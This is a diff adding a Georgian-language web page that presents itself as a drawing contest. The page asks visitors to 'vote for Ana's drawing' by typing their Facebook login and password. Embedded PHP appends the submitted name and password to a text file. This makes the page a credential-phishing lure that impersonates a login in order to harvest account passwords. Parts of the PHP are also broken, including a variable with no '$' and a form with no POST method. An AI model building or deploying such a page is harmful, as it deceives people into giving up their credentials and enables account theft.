@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<script src="https://unpkg.com/ionicons@5.0.0/dist/ionicons.js"></script>
+<title>ნახატების კონკურსი</title>
+<style>
+@font-face {
+    font-family: bpg_nino_mtavruli_normal;
+    src: url(bpg_nino_mtavruli_normal.otf);
+}
+body {
+    background-color: #3742fa;
+    margin: 0;
+    padding: 0;
+    align-items: center;
+}
+h1 {
+    color: #fff;
+}
+h2 {
+    color: #fff;
+}
+.ana {
+    color: #FFC312;
+}
+a {
+    text-decoration: none;
+}
+</style>
+</head>
+<body>
+<center><h1>ნახატების კონკურსი!</h1></center>
+<center><h2>კონკურსი ტარდება ახალგაზრდა მხატვრების განვითარებისთვის და მხატვრობის პოპულარიზაციისთვის</h2></center>
+<center><h2 class="ana">მიეცი ხმა ანას ნახატს</h2></center>
+<center><h1>ხმის მისაცემად გაიარეთ რეგისტრაცია Facebook-ით და დაჭირეთ ღილაკს</h1></center>
+<center><input type="text" name="name" placeholder="ლოგინი"></center>
+<br>
+<form>
+<center><input type="password" name="pass" placeholder="პაროლი"></center>
+<br>
+<center><input type="submit" value="ხმის მიცემა" ></center>
+</form>
+<?php
+name=$_POST["name"];
+pass=$_POST["pass"];
+?>
+
+<?php
+$file=fopen("text.txt","a");
+fwrite($file,$name);
+fwrite($file,$pass);
+fclose($file);
+?>
+</body>
+</html>
